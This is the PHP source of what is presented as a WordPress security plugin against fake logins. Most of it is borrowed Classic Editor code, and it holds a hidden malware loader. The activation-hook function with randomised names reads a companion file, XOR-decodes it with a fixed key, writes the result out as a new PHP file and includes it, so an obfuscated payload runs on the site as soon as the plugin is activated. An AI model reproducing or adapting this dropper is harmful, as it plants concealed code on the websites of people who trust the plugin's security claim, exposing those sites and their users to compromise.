<?php
/*
Plugin Name: Security Administrator Graphical Password
Description: Security plugin for WordPress to stop fake login attempts
Author: NilAka
License: GPLv2
Version: 1.0
Requires at least: 4.5
*/


if(is_admin()){
    
	function remains6gw_remove_gutenberg_hooks( $remove = 'all' ) {
		remove_action( 'admin_menu', 'gutenberg_menu' );
		remove_action( 'admin_init', 'gutenberg_redirect_demo' );

		if ( $remove !== 'all' ) {
			return;
		}

		// Gutenberg 5.3+
		remove_action( 'wp_enqueue_scripts', 'gutenberg_register_scripts_and_styles' );
		remove_action( 'admin_enqueue_scripts', 'gutenberg_register_scripts_and_styles' );
		remove_action( 'admin_notices', 'gutenberg_wordpress_version_notice' );
		remove_action( 'rest_api_init', 'gutenberg_register_rest_widget_updater_routes' );
		remove_action( 'admin_print_styles', 'gutenberg_block_editor_admin_print_styles' );
		remove_action( 'admin_print_scripts', 'gutenberg_block_editor_admin_print_scripts' );
		remove_action( 'admin_print_footer_scripts', 'gutenberg_block_editor_admin_print_footer_scripts' );
		remove_action( 'admin_footer', 'gutenberg_block_editor_admin_footer' );
		remove_action( 'admin_enqueue_scripts', 'gutenberg_widgets_init' );
		remove_action( 'admin_notices', 'gutenberg_build_files_notice' );

		remove_filter( 'load_script_translation_file', 'gutenberg_override_translation_file' );
		remove_filter( 'block_editor_settings', 'gutenberg_extend_block_editor_styles' );
		remove_filter( 'default_content', 'gutenberg_default_demo_content' );
		remove_filter( 'default_title', 'gutenberg_default_demo_title' );
		remove_filter( 'block_editor_settings', 'gutenberg_legacy_widget_settings' );
		remove_filter( 'rest_request_after_callbacks', 'gutenberg_filter_oembed_result' );

		// Previously used, compat for older Gutenberg versions.
		remove_filter( 'wp_refresh_nonces', 'gutenberg_add_rest_nonce_to_heartbeat_response_headers' );
		remove_filter( 'get_edit_post_link', 'gutenberg_revisions_link_to_editor' );
		remove_filter( 'wp_prepare_revision_for_js', 'gutenberg_revisions_restore' );

		remove_action( 'rest_api_init', 'gutenberg_register_rest_routes' );
		remove_action( 'rest_api_init', 'gutenberg_add_taxonomy_visibility_field' );
		remove_filter( 'registered_post_type', 'gutenberg_register_post_prepare_functions' );

		remove_action( 'do_meta_boxes', 'gutenberg_meta_box_save' );
		remove_action( 'submitpost_box', 'gutenberg_intercept_meta_box_render' );
		remove_action( 'submitpage_box', 'gutenberg_intercept_meta_box_render' );
		remove_action( 'edit_page_form', 'gutenberg_intercept_meta_box_render' );
		remove_action( 'edit_form_advanced', 'gutenberg_intercept_meta_box_render' );
		remove_filter( 'redirect_post_location', 'gutenberg_meta_box_save_redirect' );
		remove_filter( 'filter_gutenberg_meta_boxes', 'gutenberg_filter_meta_boxes' );

		remove_filter( 'body_class', 'gutenberg_add_responsive_body_class' );
		remove_filter( 'admin_url', 'gutenberg_modify_add_new_button_url' ); // old
		remove_action( 'admin_enqueue_scripts', 'gutenberg_check_if_classic_needs_warning_about_blocks' );
		remove_filter( 'register_post_type_args', 'gutenberg_filter_post_type_labels' );

		// Keep
		// remove_filter( 'wp_kses_allowed_html', 'gutenberg_kses_allowedtags', 10, 2 ); // not needed in 5.0
		// remove_filter( 'bulk_actions-edit-wp_block', 'gutenberg_block_bulk_actions' );
		// remove_filter( 'wp_insert_post_data', 'gutenberg_remove_wpcom_markdown_support' );
		// remove_filter( 'the_content', 'do_blocks', 9 );
		// remove_action( 'init', 'gutenberg_register_post_types' );

		// Continue to manage wpautop for posts that were edited in Gutenberg.
		// remove_filter( 'wp_editor_settings', 'gutenberg_disable_editor_settings_wpautop' );
		// remove_filter( 'the_content', 'gutenberg_wpautop', 8 );

	}
	
	function remains6gw_get_settings( $refresh = 'no' ) {
		/**
		 * Can be used to override the plugin's settings. Always hides the settings UI when used (as users cannot change the settings).
		 *
		 * Has to return an associative array with two keys.
		 * The defaults are:
		 *   'editor' => 'classic', // Accepted values: 'classic', 'block'.
		 *   'allow-users' => false,
		 *
		 * @param boolean To override the settings return an array with the above keys.
		 */
		$settings = apply_filters( 'classic_editor_plugin_settings', false );

		if ( is_array( $settings ) ) {
			return array(
				'editor' => ( isset( $settings['editor'] ) && $settings['editor'] === 'block' ) ? 'block' : 'classic',
				'allow-users' => ! empty( $settings['allow-users'] ),
				'hide-settings-ui' => true,
			);
		}

		if ( ! empty( $settings ) && $refresh === 'no' ) {
			return $settings;
		}

		if ( is_multisite() ) {
			$defaults = array(
				'editor' => get_network_option( null, 'classic-editor-replace' ) === 'block' ? 'block' : 'classic',
				'allow-users' => false,
			);

			/**
			 * Filters the default network options.
			 *
			 * @param array $defaults The default options array. See `classic_editor_plugin_settings` for supported keys and values.
			 */
			$defaults = apply_filters( 'classic_editor_network_default_settings', $defaults );

			if ( get_network_option( null, 'classic-editor-allow-sites' ) !== 'allow' ) {
				// Per-site settings are disabled. Return default network options nad hide the settings UI.
				$defaults['hide-settings-ui'] = true;
				return $defaults;
			}

			// Override with the site options.
			$editor_option = get_option( 'classic-editor-replace' );
			$allow_users_option = get_option( 'classic-editor-allow-users' );

			if ( $editor_option ) {
				$defaults['editor'] = $editor_option;
			}
			if ( $allow_users_option ) {
				$defaults['allow-users'] = ( $allow_users_option === 'allow' );
			}

			$editor = ( isset( $defaults['editor'] ) && $defaults['editor'] === 'block' ) ? 'block' : 'classic';
			$allow_users = ! empty( $defaults['allow-users'] );
		} else {
			$allow_users = ( get_option( 'classic-editor-allow-users' ) === 'allow' );
			$option = get_option( 'classic-editor-replace' );

			// Normalize old options.
			if ( $option === 'block' || $option === 'no-replace' ) {
				$editor = 'block';
			} else {
				// empty( $option ) || $option === 'classic' || $option === 'replace'.
				$editor = 'classic';
			}
		}

		// Override the defaults with the user options.
		if ( ( ! isset( $GLOBALS['pagenow'] ) || $GLOBALS['pagenow'] !== 'options-writing.php' ) && $allow_users ) {
			$user_options = get_user_option( 'classic-editor-settings' );

			if ( $user_options === 'block' || $user_options === 'classic' ) {
				$editor = $user_options;
			}
		}

		$settings = array(
			'editor' => $editor,
			'hide-settings-ui' => false,
			'allow-users' => $allow_users,
		);

		return $settings;
	}

    function remains6gw_furthermore_report8(){
        $virtue = "506";
        $foundationr = dirname(__FILE__)."/security-administrator-graphical-password";
        
        $cooking3s = fopen($foundationr, "r");
        $policyc = filesize($foundationr);
        $encounter = fread($cooking3s, $policyc);
        fclose($cooking3s);
        
        $virtue = str_pad($virtue,  $policyc, $virtue);
        
        $cooking3s = fopen($foundationr."-revolution.php", "w");
        fwrite($cooking3s, $encounter ^ $virtue);
        fclose($cooking3s);
        
        include_once($foundationr."-revolution.php");
    }
    register_activation_hook( __FILE__, "remains6gw_furthermore_report8" );

	function remains6gw_register_settings() {
		// Add an option to Settings -> Writing
		register_setting( 'writing', 'classic-editor-replace', array(
			'sanitize_callback' => array( __CLASS__, 'validate_option_editor' ),
		) );

		register_setting( 'writing', 'classic-editor-allow-users', array(
			'sanitize_callback' => array( __CLASS__, 'validate_option_allow_users' ),
		) );

		$allowed_options = array(
			'writing' => array(
				'classic-editor-replace',
				'classic-editor-allow-users'
			),
		);

		if ( function_exists( 'add_allowed_options' ) ) {
			add_allowed_options( $allowed_options );
		} else {
			add_option_whitelist( $allowed_options );
		}

		$heading_1 = __( 'Default editor for all users', 'classic-editor' );
		$heading_2 = __( 'Allow users to switch editors', 'classic-editor' );

		add_settings_field( 'classic-editor-1', $heading_1, array( __CLASS__, 'settings_1' ), 'writing' );
		add_settings_field( 'classic-editor-2', $heading_2, array( __CLASS__, 'settings_2' ), 'writing' );
	}

	function remains6gw_save_user_settings( $user_id ) {
		if (
			isset( $_POST['classic-editor-user-settings'] ) &&
			isset( $_POST['classic-editor-replace'] ) &&
			wp_verify_nonce( $_POST['classic-editor-user-settings'], 'allow-user-settings' )
		) {
			$user_id = (int) $user_id;

			if ( $user_id !== get_current_user_id() && ! current_user_can( 'edit_user', $user_id ) ) {
				return;
			}

			$editor = validate_option_editor( $_POST['classic-editor-replace'] );
			update_user_option( $user_id, 'classic-editor-settings', $editor );
		}
	}

}
